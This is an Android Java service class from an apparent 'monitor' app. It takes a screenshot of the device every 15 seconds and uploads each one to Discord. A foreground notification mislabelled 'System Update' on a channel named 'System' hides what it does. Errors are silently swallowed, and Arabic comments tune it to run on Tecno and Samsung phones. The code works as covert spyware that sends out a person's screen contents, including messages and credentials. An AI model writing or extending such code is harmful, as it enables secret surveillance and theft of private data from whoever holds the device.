package com.tom5.monitor;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.display.*;
import android.media.*;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.nio.ByteBuffer;

public class ScreenService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // تشغيل الإشعار فوراً وبأعلى أولوية لمنع كراش تكنو
        String cid = "system_core";
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        nm.createNotificationChannel(new NotificationChannel(cid, "System", NotificationManager.IMPORTANCE_HIGH));
        
        startForeground(1, new NotificationCompat.Builder(this, cid)
                .setContentTitle("System Update")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MAX).build());

        if (intent != null && intent.hasExtra("resData")) {
            int resCode = intent.getIntExtra("resCode", -1);
            Intent resData = intent.getParcelableExtra("resData");
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpm.getMediaProjection(resCode, resData);
            startCapture();
        }
        return START_STICKY;
    }

    private void startCapture() {
        DisplayMetrics m = new DisplayMetrics();
        ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getMetrics(m);
        // تقليل الدقة للنصف لضمان العالمية (تكنو/سامسونج/تابلت)
        imageReader = ImageReader.newInstance(m.widthPixels / 2, m.heightPixels / 2, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("Monitor", m.widthPixels / 2, m.heightPixels / 2, m.densityDpi, 
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                saveAndUpload();
                handler.postDelayed(this, 15000);
            }
        }, 5000);
    }

    private void saveAndUpload() {
        try (Image img = imageReader.acquireLatestImage()) {
            if (img != null) {
                Image.Plane[] planes = img.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                Bitmap b = Bitmap.createBitmap(img.getWidth(), img.getHeight(), Bitmap.Config.ARGB_8888);
                b.copyPixelsFromBuffer(buffer);
                
                // حفظ بملف أولاً (حل مشكلة الكراش)
                File f = new File(getCacheDir(), "capture.jpg");
                try (FileOutputStream out = new FileOutputStream(f)) {
                    b.compress(Bitmap.CompressFormat.JPEG, 50, out);
                    DiscordSender.sendPhoto(f); // الرفع للديسكورد
                }
                b.recycle();
            }
        } catch (Exception e) {}
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
